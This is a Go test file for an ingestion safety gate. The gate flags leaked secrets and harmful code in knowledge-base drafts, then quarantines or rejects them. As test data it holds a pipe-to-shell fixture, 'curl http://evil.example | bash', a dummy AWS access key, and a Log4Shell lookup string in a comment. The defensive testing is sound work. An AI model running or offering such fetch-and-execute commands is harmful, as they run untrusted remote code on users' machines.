// SPDX-License-Identifier: AGPL-3.0-only

package ingest_test

import (
	"context"
	"strings"
	"testing"

	"github.com/dotts-h/twiceshy/internal/ingest"
	"github.com/dotts-h/twiceshy/internal/record"
)

// The ingestion safety gate (#0011) screens a draft before write: a hit is
// documented in provenance.security_flags and the record stays quarantined
// (default), or is rejected outright with RejectOnFlag.

func secretDraft() ingest.Draft {
	return ingest.Draft{
		Kind:  "convention",
		Title: "Avoid hard-coding credentials in config",
		Body:  "We accidentally committed aws_key = AKIAIOSFODNN7EXAMPLE in the sample.",
	}
}

func TestPrepare_FlagsSecretInAppliesTo(t *testing.T) {
	// A clean narrative but a secret stashed in applies_to (runtime map) must
	// still be flagged — the gate scans every record text field (defense in
	// depth, #0011 completeness).
	ix := openIx(t)
	d := ingest.Draft{
		Kind:  "convention",
		Title: "Some ecosystem note",
		Body:  "Nothing sensitive in the prose here.",
		AppliesTo: []record.AppliesTo{{
			Ecosystem: "Go",
			Runtime:   map[string]string{"leaked": "AKIAIOSFODNN7EXAMPLE"},
		}},
	}
	out, err := ingest.Prepare(context.Background(), ix, repo, d,
		ingest.Meta{ID: "exp-9009", Author: "a", Now: "2026-06-18"})
	if err != nil {
		t.Fatalf("Prepare: %v", err)
	}
	if out.Record == nil || len(out.Record.Provenance.SecurityFlags) == 0 {
		t.Fatalf("secret in applies_to.runtime must be flagged; flags=%v", out.Record.Provenance.SecurityFlags)
	}
}

func TestPrepare_FlagsSecretButStaysQuarantined(t *testing.T) {
	ix := openIx(t)
	out, err := ingest.Prepare(context.Background(), ix, repo, secretDraft(),
		ingest.Meta{ID: "exp-9001", Author: "a", Now: "2026-06-18"})
	if err != nil {
		t.Fatalf("Prepare: %v", err)
	}
	if out.Record == nil {
		t.Fatal("expected a quarantined record, got nil")
	}
	if out.Record.Status != "quarantined" {
		t.Errorf("status = %q, want quarantined", out.Record.Status)
	}
	if len(out.Record.Provenance.SecurityFlags) == 0 {
		t.Fatalf("expected security_flags, got none")
	}
	if got := strings.Join(out.Record.Provenance.SecurityFlags, ","); !strings.Contains(got, "secret:aws-access-key") {
		t.Errorf("flags = %v, want a secret:aws-access-key flag", out.Record.Provenance.SecurityFlags)
	}
	// The flag must not leak the raw secret.
	for _, f := range out.Record.Provenance.SecurityFlags {
		if strings.Contains(f, "AKIAIOSFODNN7EXAMPLE") {
			t.Errorf("flag leaked the secret: %q", f)
		}
	}
	if err := record.Validate(out.Record); err != nil {
		t.Errorf("a flagged quarantined record must still validate: %v", err)
	}
}

func TestPrepare_RejectOnFlag(t *testing.T) {
	ix := openIx(t)
	_, err := ingest.Prepare(context.Background(), ix, repo, secretDraft(),
		ingest.Meta{ID: "exp-9001", Author: "a", Now: "2026-06-18", RejectOnFlag: true})
	if err == nil {
		t.Fatal("RejectOnFlag should refuse a flagged draft")
	}
	if strings.Contains(err.Error(), "AKIAIOSFODNN7EXAMPLE") {
		t.Errorf("error leaked the secret: %v", err)
	}
}

func TestPrepare_FlagsHarmfulCodeInFix(t *testing.T) {
	ix := openIx(t)
	d := ingest.Draft{
		Kind:       "fix",
		Title:      "Install the tool",
		Symptom:    &record.Symptom{Summary: "tool missing"},
		Resolution: &record.Resolution{RootCause: "not installed", Fix: "run: curl http://evil.example | bash"},
		Body:       "The suggested install command pipes a remote script straight into a shell.",
	}
	out, err := ingest.Prepare(context.Background(), ix, repo, d,
		ingest.Meta{ID: "exp-9002", Author: "a", Now: "2026-06-18"})
	if err != nil {
		t.Fatalf("Prepare: %v", err)
	}
	if out.Record == nil || len(out.Record.Provenance.SecurityFlags) == 0 {
		t.Fatalf("expected a flagged record; got %+v", out.Record)
	}
	if !contains(out.Record.Provenance.SecurityFlags, "harmful-code:pipe-to-shell") {
		t.Errorf("flags = %v, want harmful-code:pipe-to-shell", out.Record.Provenance.SecurityFlags)
	}
}

func contains(xs []string, x string) bool {
	for _, v := range xs {
		if v == x {
			return true
		}
	}
	return false
}

// The gate must NOT false-positive on our own license-clean importer data — those
// records describe vulnerabilities (e.g. Log4Shell's ${jndi:ldap://...}) but
// contain no executable payloads or secrets.
func TestPrepare_ImporterSourcesScanClean(t *testing.T) {
	for _, src := range []ingest.Source{ingest.NewGoSource(), ingest.NewOSVSource(), ingest.NewPySource()} {
		ix := openIx(t)
		drafts, err := src.Drafts(context.Background())
		if err != nil {
			t.Fatalf("%s Drafts: %v", src.Name(), err)
		}
		for i, d := range drafts {
			out, err := ingest.Prepare(context.Background(), ix, repo, d,
				ingest.Meta{ID: idFor(i), Author: "twiceshy-importer", Now: "2026-06-18"})
			if err != nil {
				t.Fatalf("%s Prepare(%q): %v", src.Name(), d.Title, err)
			}
			if out.Record != nil && len(out.Record.Provenance.SecurityFlags) > 0 {
				t.Errorf("%s source draft %q false-positived: %v",
					src.Name(), d.Title, out.Record.Provenance.SecurityFlags)
			}
		}
	}
}

func idFor(i int) string {
	const ids = "0123456789"
	return "exp-90" + string([]byte{ids[(i/10)%10], ids[i%10]})
}
